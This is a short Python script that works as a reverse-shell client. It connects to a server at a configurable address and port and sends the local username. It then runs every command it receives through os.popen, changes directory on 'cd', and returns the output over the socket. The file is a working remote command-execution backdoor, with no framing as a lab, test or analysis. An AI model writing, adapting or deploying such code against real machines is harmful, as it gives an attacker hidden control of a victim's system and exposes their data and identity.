import socket
from getpass import getuser
import os, sys


SERVER_IP = '127.0.0.1'
SERVER_PORT = 3056
SIZE = 1024
ADDR = (SERVER_IP, SERVER_PORT)


def run_os(cmd):
    res = os.popen(cmd).read()
    if res == '':
        res = 'No Result'
    return res


def receive_file(filename):
    pass


client_socket = socket.socket()
try:
    client_socket.connect(ADDR)
    client_socket.sendall(getuser().encode())
    while True:
        cmd = client_socket.recv(SIZE).decode()
        print(cmd)

        if cmd[:2] == 'cd':
            os.chdir(cmd[3:])
            client_socket.sendall('cd complete'.encode())
            continue
        res = run_os(cmd)
        client_socket.sendall(res.encode())

except:
    client_socket.sendall('Error'.encode())
finally:
    client_socket.close()
